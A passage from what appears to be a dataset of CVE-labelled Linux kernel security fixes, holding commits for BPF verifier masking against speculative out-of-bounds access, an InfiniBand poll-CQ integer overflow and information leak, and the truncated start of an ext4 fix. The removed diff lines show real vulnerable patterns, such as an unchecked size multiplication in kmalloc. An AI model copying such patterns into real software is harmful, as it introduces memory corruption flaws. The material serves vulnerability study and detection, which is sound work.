the\npointer arithmetic result in the destination register will\nstay unchanged, meaning offset masked into zero similar as\nin array_index_nospec() case. With regards to implementation,\nthere are three options that were considered: i) new insn\nfor sanitation, ii) push\/pop insn and sanitation as inlined\nBPF, iii) reuse of ax register and sanitation as inlined BPF.\n\nOption i) has the downside that we end up using from reserved\nbits in the opcode space, but also that we would require\neach JIT to emit masking as native arch opcodes meaning\nmitigation would have slow adoption till everyone implements\nit eventually which is counter-productive. Option ii) and iii)\nhave both in common that a temporary register is needed in\norder to implement the sanitation as inlined BPF since we\nare not allowed to modify the source register. While a push \/\npop insn in ii) would be useful to have in any case, it\nrequires once again that every JIT needs to implement it\nfirst. While possible, amount of changes needed would also\nbe unsuitable for a -stable patch. Therefore, the path which\nhas fewer changes, less BPF instructions for the mitigation\nand does not require anything to be changed in the JITs is\noption iii) which this work is pursuing. The ax register is\nalready mapped to a register in all JITs (modulo arm32 where\nit's mapped to stack as various other BPF registers there)\nand used in constant blinding for JITs-only so far. It can\nbe reused for verifier rewrites under certain constraints.\nThe interpreter's tmp \"register\" has therefore been remapped\ninto extending the register set with hidden ax register and\nreusing that for a number of instructions that needed the\nprior temporary variable internally (e.g. div, mod). This\nallows for zero increase in stack space usage in the interpreter,\nand enables (restricted) generic use in rewrites otherwise as\nlong as such a patchlet does not make use of these instructions.\nThe sanitation mask is dynamic and relative to the offset the\nmap value or stack pointer currently holds.\n\nThere are various cases that need to be taken under consideration\nfor the masking, e.g. such operation could look as follows:\nptr += val or val += ptr or ptr -= val. Thus, the value to be\nsanitized could reside either in source or in destination\nregister, and the limit is different depending on whether\nthe ALU op is addition or subtraction and depending on the\ncurrent known and bounded offset. The limit is derived as\nfollows: limit := max_value_size - (smin_value + off). For\nsubtraction: limit := umax_value + off. This holds because\nwe do not allow any pointer arithmetic that would\ntemporarily go out of bounds or would have an unknown\nvalue with mixed signed bounds where it is unclear at\nverification time whether the actual runtime value would\nbe either negative or positive. For example, we have a\nderived map pointer value with constant offset and bounded\none, so limit based on smin_value works because the verifier\nrequires that statically analyzed arithmetic on the pointer\nmust be in bounds, and thus it checks if resulting\nsmin_value + off and umax_value + off is still within map\nvalue bounds at time of arithmetic in addition to time of\naccess. Similarly, for the case of stack access we derive\nthe limit as follows: MAX_BPF_STACK + off for subtraction\nand -off for the case of addition where off := ptr_reg->off +\nptr_reg->var_off.value. Subtraction is a special case for\nthe masking which can be in form of ptr += -val, ptr -= -val,\nor ptr -= val. In the first two cases where we know that\nthe value is negative, we need to temporarily negate the\nvalue in order to do the sanitation on a positive value\nwhere we later swap the ALU op, and restore original source\nregister if the value was in source.\n\nThe sanitation of pointer arithmetic alone is still not fully\nsufficient as is, since a scenario like the following could\nhappen ...\n\n  PTR += 0x1000 (e.g. K-based imm)\n  PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON\n  PTR += 0x1000\n  PTR -= BIG_NUMBER_WITH_SLOW_COMPARISON\n  [...]\n\n... which under speculation could end up as ...\n\n  PTR += 0x1000\n  PTR -= 0 [ truncated by mitigation ]\n  PTR += 0x1000\n  PTR -= 0 [ truncated by mitigation ]\n  [...]\n\n... and therefore still access out of bounds. To prevent such\ncase, the verifier is also analyzing safety for potential out\nof bounds access under speculative execution. Meaning, it is\nalso simulating pointer access under truncation. We therefore\n\"branch off\" and push the current verification state after the\nALU operation with known 0 to the verification stack for later\nanalysis. Given the current path analysis succeeded it is\nlikely that the one under speculation can be pruned. In any\ncase, it is also subject to existing complexity limits and\ntherefore anything beyond this point will be rejected. In\nterms of pruning, it needs to be ensured that the verification\nstate from speculative execution simulation must never prune\na non-speculative execution path, therefore, we mark verifier\nstate accordingly at the time of push_stack(). If verifier\ndetects out of bounds access under speculative execution from\none of the possible paths that includes a truncation, it will\nreject such program.\n\nGiven we mask every reg-based pointer arithmetic for\nunprivileged programs, we've been looking into how it could\naffect real-world programs in terms of size increase. As the\nmajority of programs are targeted for privileged-only use\ncase, we've unconditionally enabled masking (with its alu\nrestrictions on top of it) for privileged programs for the\nsake of testing in order to check i) whether they get rejected\nin its current form, and ii) by how much the number of\ninstructions and size will increase. We've tested this by\nusing Katran, Cilium and test_l4lb from the kernel selftests.\nFor Katran we've evaluated balancer_kern.o, Cilium bpf_lxc.o\nand an older test object bpf_lxc_opt_-DUNKNOWN.o and l4lb\nwe've used test_l4lb.o as well as test_l4lb_noinline.o. We\nfound that none of the programs got rejected by the verifier\nwith this change, and that impact is rather minimal to none.\nbalancer_kern.o had 13,904 bytes (1,738 insns) xlated and\n7,797 bytes JITed before and after the change. Most complex\nprogram in bpf_lxc.o had 30,544 bytes (3,817 insns) xlated\nand 18,538 bytes JITed before and after and none of the other\ntail call programs in bpf_lxc.o had any changes either. For\nthe older bpf_lxc_opt_-DUNKNOWN.o object we found a small\nincrease from 20,616 bytes (2,576 insns) and 12,536 bytes JITed\nbefore to 20,664 bytes (2,582 insns) and 12,558 bytes JITed\nafter the change. Other programs from that object file had\nsimilar small increase. Both test_l4lb.o had no change and\nremained at 6,544 bytes (817 insns) xlated and 3,401 bytes\nJITed and for test_l4lb_noinline.o constant at 5,080 bytes\n(634 insns) xlated and 3,313 bytes JITed. This can be explained\nin that LLVM typically optimizes stack based pointer arithmetic\nby using K-based operations and that use of dynamic map access\nis not overly frequent. However, in future we may decide to\noptimize the algorithm further under known guarantees from\nbranch and value speculation. Latter seems also unclear in\nterms of prediction heuristics that today's CPUs apply as well\nas whether there could be collisions in e.g. the predictor's\nValue History\/Pattern Table for triggering out of bounds access,\nthus masking is performed unconditionally at this point but could\nbe subject to relaxation later on. We were generally also\nbrainstorming various other approaches for mitigation, but the\nblocker was always lack of available registers at runtime and\/or\noverhead for runtime tracking of limits belonging to a specific\npointer. Thus, we found this to be minimally intrusive under\ngiven constraints.\n\nWith that in place, a simple example with sanitized access on\nunprivileged load at post-verification time looks as follows:\n\n  # bpftool prog dump xlated id 282\n  [...]\n  28: (79) r1 = *(u64 *)(r7 +0)\n  29: (79) r2 = *(u64 *)(r7 +8)\n  30: (57) r1 &= 15\n  31: (79) r3 = *(u64 *)(r0 +4608)\n  32: (57) r3 &= 1\n  33: (47) r3 |= 1\n  34: (2d) if r2 > r3 goto pc+19\n  35: (b4) (u32) r11 = (u32) 20479  |\n  36: (1f) r11 -= r2                | Dynamic sanitation for pointer\n  37: (4f) r11 |= r2                | arithmetic with registers\n  38: (87) r11 = -r11               | containing bounded or known\n  39: (c7) r11 s>>= 63              | scalars in order to prevent\n  40: (5f) r11 &= r2                | out of bounds speculation.\n  41: (0f) r4 += r11                |\n  42: (71) r4 = *(u8 *)(r4 +0)\n  43: (6f) r4 <<= r1\n  [...]\n\nFor the case where the scalar sits in the destination register\nas opposed to the source register, the following code is emitted\nfor the above example:\n\n  [...]\n  16: (b4) (u32) r11 = (u32) 20479\n  17: (1f) r11 -= r2\n  18: (4f) r11 |= r2\n  19: (87) r11 = -r11\n  20: (c7) r11 s>>= 63\n  21: (5f) r2 &= r11\n  22: (0f) r2 += r0\n  23: (61) r0 = *(u32 *)(r2 +0)\n  [...]\n\nJIT blinding example with non-conflicting use of r10:\n\n  [...]\n   d5:\tje     0x0000000000000106    _\n   d7:\tmov    0x0(%rax),%edi       |\n   da:\tmov    $0xf153246,%r10d     | Index load from map value and\n   e0:\txor    $0xf153259,%r10      | (const blinded) mask with 0x1f.\n   e7:\tand    %r10,%rdi            |_\n   ea:\tmov    $0x2f,%r10d          |\n   f0:\tsub    %rdi,%r10            | Sanitized addition. Both use r10\n   f3:\tor     %rdi,%r10            | but do not interfere with each\n   f6:\tneg    %r10                 | other. (Neither do these instructions\n   f9:\tsar    $0x3f,%r10           | interfere with the use of ax as temp\n   fd:\tand    %r10,%rdi            | in interpreter.)\n  100:\tadd    %rax,%rdi            |_\n  103:\tmov    0x0(%rdi),%eax\n [...]\n\nTested that it fixes Jann's reproducer, and also checked that test_verifier\nand test_progs suite with interpreter, JIT and JIT with hardening enabled\non x86-64 and arm64 runs successfully.\n\n  [0] Speculose: Analyzing the Security Implications of Speculative\n      Execution in CPUs, Giorgi Maisuradze and Christian Rossow,\n      https:\/\/arxiv.org\/pdf\/1801.04084.pdf\n\n  [1] A Systematic Evaluation of Transient Execution Attacks and\n      Defenses, Claudio Canella, Jo Van Bulck, Michael Schwarz,\n      Moritz Lipp, Benjamin von Berg, Philipp Ortner, Frank Piessens,\n      Dmitry Evtyushkin, Daniel Gruss,\n      https:\/\/arxiv.org\/pdf\/1811.05441.pdf\n\nFixes: b2157399cc98 (\"bpf: prevent out-of-bounds speculation\")\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>\nAcked-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: Alexei Starovoitov <ast@kernel.org>\n---\n include\/linux\/bpf_verifier.h |  10 +++\n kernel\/bpf\/verifier.c        | 185 +++++++++++++++++++++++++++++++++++++++++--\n 2 files changed, 189 insertions(+), 6 deletions(-)\n\n","diff_code":"diff --git a\/include\/linux\/bpf_verifier.h b\/include\/linux\/bpf_verifier.h\nindex 3f84f3e87704..27b74947cd2b 100644\n--- a\/include\/linux\/bpf_verifier.h\n+++ b\/include\/linux\/bpf_verifier.h\n@@ -148,6 +148,7 @@ struct bpf_verifier_state {\n \t\/* call stack tracking *\/\n \tstruct bpf_func_state *frame[MAX_CALL_FRAMES];\n \tu32 curframe;\n+\tbool speculative;\n };\n \n #define bpf_get_spilled_reg(slot, frame)\t\t\t\t\\\n@@ -167,15 +168,24 @@ struct bpf_verifier_state_list {\n \tstruct bpf_verifier_state_list *next;\n };\n \n+\/* Possible states for alu_state member. *\/\n+#define BPF_ALU_SANITIZE_SRC\t\t1U\n+#define BPF_ALU_SANITIZE_DST\t\t2U\n+#define BPF_ALU_NEG_VALUE\t\t(1U << 2)\n+#define BPF_ALU_SANITIZE\t\t(BPF_ALU_SANITIZE_SRC | \\\n+\t\t\t\t\t BPF_ALU_SANITIZE_DST)\n+\n struct bpf_insn_aux_data {\n \tunion {\n \t\tenum bpf_reg_type ptr_type;\t\/* pointer type for load\/store insns *\/\n \t\tunsigned long map_state;\t\/* pointer\/poison value for maps *\/\n \t\ts32 call_imm;\t\t\t\/* saved imm field of call insn *\/\n+\t\tu32 alu_limit;\t\t\t\/* limit for add\/sub register with pointer *\/\n \t};\n \tint ctx_field_size; \/* the ctx field size for load insn, maybe 0 *\/\n \tint sanitize_stack_off; \/* stack slot to be cleared *\/\n \tbool seen; \/* this insn was processed by the verifier *\/\n+\tu8 alu_state; \/* used in combination with alu_limit *\/\n };\n \n #define MAX_USED_MAPS 64 \/* max number of maps accessed by one eBPF program *\/\ndiff --git a\/kernel\/bpf\/verifier.c b\/kernel\/bpf\/verifier.c\nindex 8e5da1ce5da4..f6bc62a9ee8e 100644\n--- a\/kernel\/bpf\/verifier.c\n+++ b\/kernel\/bpf\/verifier.c\n@@ -710,6 +710,7 @@ static int copy_verifier_state(struct bpf_verifier_state *dst_state,\n \t\tfree_func_state(dst_state->frame[i]);\n \t\tdst_state->frame[i] = NULL;\n \t}\n+\tdst_state->speculative = src->speculative;\n \tdst_state->curframe = src->curframe;\n \tfor (i = 0; i <= src->curframe; i++) {\n \t\tdst = dst_state->frame[i];\n@@ -754,7 +755,8 @@ static int pop_stack(struct bpf_verifier_env *env, int *prev_insn_idx,\n }\n \n static struct bpf_verifier_state *push_stack(struct bpf_verifier_env *env,\n-\t\t\t\t\t     int insn_idx, int prev_insn_idx)\n+\t\t\t\t\t     int insn_idx, int prev_insn_idx,\n+\t\t\t\t\t     bool speculative)\n {\n \tstruct bpf_verifier_state *cur = env->cur_state;\n \tstruct bpf_verifier_stack_elem *elem;\n@@ -772,6 +774,7 @@ static struct bpf_verifier_state *push_stack(struct bpf_verifier_env *env,\n \terr = copy_verifier_state(&elem->st, cur);\n \tif (err)\n \t\tgoto err;\n+\telem->st.speculative |= speculative;\n \tif (env->stack_size > BPF_COMPLEXITY_LIMIT_STACK) {\n \t\tverbose(env, \"BPF program is too complex\\n\");\n \t\tgoto err;\n@@ -3067,6 +3070,102 @@ static bool check_reg_sane_offset(struct bpf_verifier_env *env,\n \treturn true;\n }\n \n+static struct bpf_insn_aux_data *cur_aux(struct bpf_verifier_env *env)\n+{\n+\treturn &env->insn_aux_data[env->insn_idx];\n+}\n+\n+static int retrieve_ptr_limit(const struct bpf_reg_state *ptr_reg,\n+\t\t\t      u32 *ptr_limit, u8 opcode, bool off_is_neg)\n+{\n+\tbool mask_to_left = (opcode == BPF_ADD &&  off_is_neg) ||\n+\t\t\t    (opcode == BPF_SUB && !off_is_neg);\n+\tu32 off;\n+\n+\tswitch (ptr_reg->type) {\n+\tcase PTR_TO_STACK:\n+\t\toff = ptr_reg->off + ptr_reg->var_off.value;\n+\t\tif (mask_to_left)\n+\t\t\t*ptr_limit = MAX_BPF_STACK + off;\n+\t\telse\n+\t\t\t*ptr_limit = -off;\n+\t\treturn 0;\n+\tcase PTR_TO_MAP_VALUE:\n+\t\tif (mask_to_left) {\n+\t\t\t*ptr_limit = ptr_reg->umax_value + ptr_reg->off;\n+\t\t} else {\n+\t\t\toff = ptr_reg->smin_value + ptr_reg->off;\n+\t\t\t*ptr_limit = ptr_reg->map_ptr->value_size - off;\n+\t\t}\n+\t\treturn 0;\n+\tdefault:\n+\t\treturn -EINVAL;\n+\t}\n+}\n+\n+static int sanitize_ptr_alu(struct bpf_verifier_env *env,\n+\t\t\t    struct bpf_insn *insn,\n+\t\t\t    const struct bpf_reg_state *ptr_reg,\n+\t\t\t    struct bpf_reg_state *dst_reg,\n+\t\t\t    bool off_is_neg)\n+{\n+\tstruct bpf_verifier_state *vstate = env->cur_state;\n+\tstruct bpf_insn_aux_data *aux = cur_aux(env);\n+\tbool ptr_is_dst_reg = ptr_reg == dst_reg;\n+\tu8 opcode = BPF_OP(insn->code);\n+\tu32 alu_state, alu_limit;\n+\tstruct bpf_reg_state tmp;\n+\tbool ret;\n+\n+\tif (env->allow_ptr_leaks || BPF_SRC(insn->code) == BPF_K)\n+\t\treturn 0;\n+\n+\t\/* We already marked aux for masking from non-speculative\n+\t * paths, thus we got here in the first place. We only care\n+\t * to explore bad access from here.\n+\t *\/\n+\tif (vstate->speculative)\n+\t\tgoto do_sim;\n+\n+\talu_state  = off_is_neg ? BPF_ALU_NEG_VALUE : 0;\n+\talu_state |= ptr_is_dst_reg ?\n+\t\t     BPF_ALU_SANITIZE_SRC : BPF_ALU_SANITIZE_DST;\n+\n+\tif (retrieve_ptr_limit(ptr_reg, &alu_limit, opcode, off_is_neg))\n+\t\treturn 0;\n+\n+\t\/* If we arrived here from different branches with different\n+\t * limits to sanitize, then this won't work.\n+\t *\/\n+\tif (aux->alu_state &&\n+\t    (aux->alu_state != alu_state ||\n+\t     aux->alu_limit != alu_limit))\n+\t\treturn -EACCES;\n+\n+\t\/* Corresponding fixup done in fixup_bpf_calls(). *\/\n+\taux->alu_state = alu_state;\n+\taux->alu_limit = alu_limit;\n+\n+do_sim:\n+\t\/* Simulate and find potential out-of-bounds access under\n+\t * speculative execution from truncation as a result of\n+\t * masking when off was not within expected range. If off\n+\t * sits in dst, then we temporarily need to move ptr there\n+\t * to simulate dst (== 0) +\/-= ptr. Needed, for example,\n+\t * for cases where we use K-based arithmetic in one direction\n+\t * and truncated reg-based in the other in order to explore\n+\t * bad access.\n+\t *\/\n+\tif (!ptr_is_dst_reg) {\n+\t\ttmp = *dst_reg;\n+\t\t*dst_reg = *ptr_reg;\n+\t}\n+\tret = push_stack(env, env->insn_idx + 1, env->insn_idx, true);\n+\tif (!ptr_is_dst_reg)\n+\t\t*dst_reg = tmp;\n+\treturn !ret ? -EFAULT : 0;\n+}\n+\n \/* Handles arithmetic on a pointer and a scalar: computes new min\/max and var_off.\n  * Caller should also handle BPF_MOV case separately.\n  * If we return -EACCES, caller may want to try again treating pointer as a\n@@ -3087,6 +3186,7 @@ static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,\n \t    umin_ptr = ptr_reg->umin_value, umax_ptr = ptr_reg->umax_value;\n \tu32 dst = insn->dst_reg, src = insn->src_reg;\n \tu8 opcode = BPF_OP(insn->code);\n+\tint ret;\n \n \tdst_reg = &regs[dst];\n \n@@ -3142,6 +3242,11 @@ static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,\n \n \tswitch (opcode) {\n \tcase BPF_ADD:\n+\t\tret = sanitize_ptr_alu(env, insn, ptr_reg, dst_reg, smin_val < 0);\n+\t\tif (ret < 0) {\n+\t\t\tverbose(env, \"R%d tried to add from different maps or paths\\n\", dst);\n+\t\t\treturn ret;\n+\t\t}\n \t\t\/* We can take a fixed offset as long as it doesn't overflow\n \t\t * the s32 'off' field\n \t\t *\/\n@@ -3192,6 +3297,11 @@ static int adjust_ptr_min_max_vals(struct bpf_verifier_env *env,\n \t\t}\n \t\tbreak;\n \tcase BPF_SUB:\n+\t\tret = sanitize_ptr_alu(env, insn, ptr_reg, dst_reg, smin_val < 0);\n+\t\tif (ret < 0) {\n+\t\t\tverbose(env, \"R%d tried to sub from different maps or paths\\n\", dst);\n+\t\t\treturn ret;\n+\t\t}\n \t\tif (dst_reg == off_reg) {\n \t\t\t\/* scalar -= pointer.  Creates an unknown scalar *\/\n \t\t\tverbose(env, \"R%d tried to subtract pointer from scalar\\n\",\n@@ -4389,7 +4499,8 @@ static int check_cond_jmp_op(struct bpf_verifier_env *env,\n \t\t}\n \t}\n \n-\tother_branch = push_stack(env, *insn_idx + insn->off + 1, *insn_idx);\n+\tother_branch = push_stack(env, *insn_idx + insn->off + 1, *insn_idx,\n+\t\t\t\t  false);\n \tif (!other_branch)\n \t\treturn -EFAULT;\n \tother_branch_regs = other_branch->frame[other_branch->curframe]->regs;\n@@ -5499,6 +5610,12 @@ static bool states_equal(struct bpf_verifier_env *env,\n \tif (old->curframe != cur->curframe)\n \t\treturn false;\n \n+\t\/* Verification state from speculative execution simulation\n+\t * must never prune a non-speculative execution one.\n+\t *\/\n+\tif (old->speculative && !cur->speculative)\n+\t\treturn false;\n+\n \t\/* for states to be equal callsites have to be the same\n \t * and all frame states need to be equivalent\n \t *\/\n@@ -5700,6 +5817,7 @@ static int do_check(struct bpf_verifier_env *env)\n \tif (!state)\n \t\treturn -ENOMEM;\n \tstate->curframe = 0;\n+\tstate->speculative = false;\n \tstate->frame[0] = kzalloc(sizeof(struct bpf_func_state), GFP_KERNEL);\n \tif (!state->frame[0]) {\n \t\tkfree(state);\n@@ -5739,8 +5857,10 @@ static int do_check(struct bpf_verifier_env *env)\n \t\t\t\/* found equivalent state, can prune the search *\/\n \t\t\tif (env->log.level) {\n \t\t\t\tif (do_print_state)\n-\t\t\t\t\tverbose(env, \"\\nfrom %d to %d: safe\\n\",\n-\t\t\t\t\t\tenv->prev_insn_idx, env->insn_idx);\n+\t\t\t\t\tverbose(env, \"\\nfrom %d to %d%s: safe\\n\",\n+\t\t\t\t\t\tenv->prev_insn_idx, env->insn_idx,\n+\t\t\t\t\t\tenv->cur_state->speculative ?\n+\t\t\t\t\t\t\" (speculative execution)\" : \"\");\n \t\t\t\telse\n \t\t\t\t\tverbose(env, \"%d: safe\\n\", env->insn_idx);\n \t\t\t}\n@@ -5757,8 +5877,10 @@ static int do_check(struct bpf_verifier_env *env)\n \t\t\tif (env->log.level > 1)\n \t\t\t\tverbose(env, \"%d:\", env->insn_idx);\n \t\t\telse\n-\t\t\t\tverbose(env, \"\\nfrom %d to %d:\",\n-\t\t\t\t\tenv->prev_insn_idx, env->insn_idx);\n+\t\t\t\tverbose(env, \"\\nfrom %d to %d%s:\",\n+\t\t\t\t\tenv->prev_insn_idx, env->insn_idx,\n+\t\t\t\t\tenv->cur_state->speculative ?\n+\t\t\t\t\t\" (speculative execution)\" : \"\");\n \t\t\tprint_verifier_state(env, state->frame[state->curframe]);\n \t\t\tdo_print_state = false;\n \t\t}\n@@ -6750,6 +6872,57 @@ static int fixup_bpf_calls(struct bpf_verifier_env *env)\n \t\t\tcontinue;\n \t\t}\n \n+\t\tif (insn->code == (BPF_ALU64 | BPF_ADD | BPF_X) ||\n+\t\t    insn->code == (BPF_ALU64 | BPF_SUB | BPF_X)) {\n+\t\t\tconst u8 code_add = BPF_ALU64 | BPF_ADD | BPF_X;\n+\t\t\tconst u8 code_sub = BPF_ALU64 | BPF_SUB | BPF_X;\n+\t\t\tstruct bpf_insn insn_buf[16];\n+\t\t\tstruct bpf_insn *patch = &insn_buf[0];\n+\t\t\tbool issrc, isneg;\n+\t\t\tu32 off_reg;\n+\n+\t\t\taux = &env->insn_aux_data[i + delta];\n+\t\t\tif (!aux->alu_state)\n+\t\t\t\tcontinue;\n+\n+\t\t\tisneg = aux->alu_state & BPF_ALU_NEG_VALUE;\n+\t\t\tissrc = (aux->alu_state & BPF_ALU_SANITIZE) ==\n+\t\t\t\tBPF_ALU_SANITIZE_SRC;\n+\n+\t\t\toff_reg = issrc ? insn->src_reg : insn->dst_reg;\n+\t\t\tif (isneg)\n+\t\t\t\t*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);\n+\t\t\t*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit - 1);\n+\t\t\t*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);\n+\t\t\t*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);\n+\t\t\t*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);\n+\t\t\t*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);\n+\t\t\tif (issrc) {\n+\t\t\t\t*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX,\n+\t\t\t\t\t\t\t off_reg);\n+\t\t\t\tinsn->src_reg = BPF_REG_AX;\n+\t\t\t} else {\n+\t\t\t\t*patch++ = BPF_ALU64_REG(BPF_AND, off_reg,\n+\t\t\t\t\t\t\t BPF_REG_AX);\n+\t\t\t}\n+\t\t\tif (isneg)\n+\t\t\t\tinsn->code = insn->code == code_add ?\n+\t\t\t\t\t     code_sub : code_add;\n+\t\t\t*patch++ = *insn;\n+\t\t\tif (issrc && isneg)\n+\t\t\t\t*patch++ = BPF_ALU64_IMM(BPF_MUL, off_reg, -1);\n+\t\t\tcnt = patch - insn_buf;\n+\n+\t\t\tnew_prog = bpf_patch_insn_data(env, i + delta, insn_buf, cnt);\n+\t\t\tif (!new_prog)\n+\t\t\t\treturn -ENOMEM;\n+\n+\t\t\tdelta    += cnt - 1;\n+\t\t\tenv->prog = prog = new_prog;\n+\t\t\tinsn      = new_prog->insnsi + i + delta;\n+\t\t\tcontinue;\n+\t\t}\n+\n \t\tif (insn->code != (BPF_JMP | BPF_CALL))\n \t\t\tcontinue;\n \t\tif (insn->src_reg == BPF_PSEUDO_CALL)\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-4649","CWE_ID":"189","category":"security","commit_id":"7182afea8d1afd432a17c18162cc3fd441d0da93","commit_message":"From 7182afea8d1afd432a17c18162cc3fd441d0da93 Mon Sep 17 00:00:00 2001\nFrom: Dan Carpenter <error27@gmail.com>\nDate: Wed, 13 Oct 2010 09:13:12 +0000\nSubject: IB\/uverbs: Handle large number of entries in poll CQ\n\nIn ib_uverbs_poll_cq() code there is a potential integer overflow if\nuserspace passes in a large cmd.ne.  The calls to kmalloc() would\nallocate smaller buffers than intended, leading to memory corruption.\nThere iss also an information leak if resp wasn't all used.\nUnprivileged userspace may call this function, although only if an\nRDMA device that uses this function is present.\n\nFix this by copying CQ entries one at a time, which avoids the\nallocation entirely, and also by moving this copying into a function\nthat makes sure to initialize all memory copied to userspace.\n\nSpecial thanks to Jason Gunthorpe <jgunthorpe@obsidianresearch.com>\nfor his help and advice.\n\nCc: <stable@kernel.org>\nSigned-off-by: Dan Carpenter <error27@gmail.com>\n\n[ Monkey around with things a bit to avoid bad code generation by gcc\n  when designated initializers are used.  - Roland ]\n\nSigned-off-by: Roland Dreier <rolandd@cisco.com>\n---\n drivers\/infiniband\/core\/uverbs_cmd.c | 99 ++++++++++++++++++++----------------\n 1 file changed, 56 insertions(+), 43 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/infiniband\/core\/uverbs_cmd.c b\/drivers\/infiniband\/core\/uverbs_cmd.c\nindex b342248aec05..c42699285f8e 100644\n--- a\/drivers\/infiniband\/core\/uverbs_cmd.c\n+++ b\/drivers\/infiniband\/core\/uverbs_cmd.c\n@@ -893,68 +893,81 @@ out:\n \treturn ret ? ret : in_len;\n }\n \n+static int copy_wc_to_user(void __user *dest, struct ib_wc *wc)\n+{\n+\tstruct ib_uverbs_wc tmp;\n+\n+\ttmp.wr_id\t\t= wc->wr_id;\n+\ttmp.status\t\t= wc->status;\n+\ttmp.opcode\t\t= wc->opcode;\n+\ttmp.vendor_err\t\t= wc->vendor_err;\n+\ttmp.byte_len\t\t= wc->byte_len;\n+\ttmp.ex.imm_data\t\t= (__u32 __force) wc->ex.imm_data;\n+\ttmp.qp_num\t\t= wc->qp->qp_num;\n+\ttmp.src_qp\t\t= wc->src_qp;\n+\ttmp.wc_flags\t\t= wc->wc_flags;\n+\ttmp.pkey_index\t\t= wc->pkey_index;\n+\ttmp.slid\t\t= wc->slid;\n+\ttmp.sl\t\t\t= wc->sl;\n+\ttmp.dlid_path_bits\t= wc->dlid_path_bits;\n+\ttmp.port_num\t\t= wc->port_num;\n+\ttmp.reserved\t\t= 0;\n+\n+\tif (copy_to_user(dest, &tmp, sizeof tmp))\n+\t\treturn -EFAULT;\n+\n+\treturn 0;\n+}\n+\n ssize_t ib_uverbs_poll_cq(struct ib_uverbs_file *file,\n \t\t\t  const char __user *buf, int in_len,\n \t\t\t  int out_len)\n {\n \tstruct ib_uverbs_poll_cq       cmd;\n-\tstruct ib_uverbs_poll_cq_resp *resp;\n+\tstruct ib_uverbs_poll_cq_resp  resp;\n+\tu8 __user                     *header_ptr;\n+\tu8 __user                     *data_ptr;\n \tstruct ib_cq                  *cq;\n-\tstruct ib_wc                  *wc;\n-\tint                            ret = 0;\n-\tint                            i;\n-\tint                            rsize;\n+\tstruct ib_wc                   wc;\n+\tint                            ret;\n \n \tif (copy_from_user(&cmd, buf, sizeof cmd))\n \t\treturn -EFAULT;\n \n-\twc = kmalloc(cmd.ne * sizeof *wc, GFP_KERNEL);\n-\tif (!wc)\n-\t\treturn -ENOMEM;\n-\n-\trsize = sizeof *resp + cmd.ne * sizeof(struct ib_uverbs_wc);\n-\tresp = kmalloc(rsize, GFP_KERNEL);\n-\tif (!resp) {\n-\t\tret = -ENOMEM;\n-\t\tgoto out_wc;\n-\t}\n-\n \tcq = idr_read_cq(cmd.cq_handle, file->ucontext, 0);\n-\tif (!cq) {\n-\t\tret = -EINVAL;\n-\t\tgoto out;\n-\t}\n+\tif (!cq)\n+\t\treturn -EINVAL;\n \n-\tresp->count = ib_poll_cq(cq, cmd.ne, wc);\n+\t\/* we copy a struct ib_uverbs_poll_cq_resp to user space *\/\n+\theader_ptr = (void __user *)(unsigned long) cmd.response;\n+\tdata_ptr = header_ptr + sizeof resp;\n \n-\tput_cq_read(cq);\n+\tmemset(&resp, 0, sizeof resp);\n+\twhile (resp.count < cmd.ne) {\n+\t\tret = ib_poll_cq(cq, 1, &wc);\n+\t\tif (ret < 0)\n+\t\t\tgoto out_put;\n+\t\tif (!ret)\n+\t\t\tbreak;\n+\n+\t\tret = copy_wc_to_user(data_ptr, &wc);\n+\t\tif (ret)\n+\t\t\tgoto out_put;\n \n-\tfor (i = 0; i < resp->count; i++) {\n-\t\tresp->wc[i].wr_id \t   = wc[i].wr_id;\n-\t\tresp->wc[i].status \t   = wc[i].status;\n-\t\tresp->wc[i].opcode \t   = wc[i].opcode;\n-\t\tresp->wc[i].vendor_err \t   = wc[i].vendor_err;\n-\t\tresp->wc[i].byte_len \t   = wc[i].byte_len;\n-\t\tresp->wc[i].ex.imm_data    = (__u32 __force) wc[i].ex.imm_data;\n-\t\tresp->wc[i].qp_num \t   = wc[i].qp->qp_num;\n-\t\tresp->wc[i].src_qp \t   = wc[i].src_qp;\n-\t\tresp->wc[i].wc_flags \t   = wc[i].wc_flags;\n-\t\tresp->wc[i].pkey_index \t   = wc[i].pkey_index;\n-\t\tresp->wc[i].slid \t   = wc[i].slid;\n-\t\tresp->wc[i].sl \t\t   = wc[i].sl;\n-\t\tresp->wc[i].dlid_path_bits = wc[i].dlid_path_bits;\n-\t\tresp->wc[i].port_num \t   = wc[i].port_num;\n+\t\tdata_ptr += sizeof(struct ib_uverbs_wc);\n+\t\t++resp.count;\n \t}\n \n-\tif (copy_to_user((void __user *) (unsigned long) cmd.response, resp, rsize))\n+\tif (copy_to_user(header_ptr, &resp, sizeof resp)) {\n \t\tret = -EFAULT;\n+\t\tgoto out_put;\n+\t}\n \n-out:\n-\tkfree(resp);\n+\tret = in_len;\n \n-out_wc:\n-\tkfree(wc);\n-\treturn ret ? ret : in_len;\n+out_put:\n+\tput_cq_read(cq);\n+\treturn ret;\n }\n \n ssize_t ib_uverbs_req_notify_cq(struct ib_uverbs_file *file,\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-2695","CWE_ID":"189","category":"security","commit_id":"f17722f917b2f21497deb6edc62fb1683daa08e6","commit_message":"From f17722f917b2f21497deb6edc62fb1683daa08e6 Mon Sep 17 00:00:00 2001\nFrom: Lukas Czerner <lczerner@redhat.com>\nDate: Mon, 6 Jun 2011 00:05:17 -0400\nSubject: ext4: Fix max file size and logical block counting of extent format\n file\n\nKazuya Mio reported that he was able to 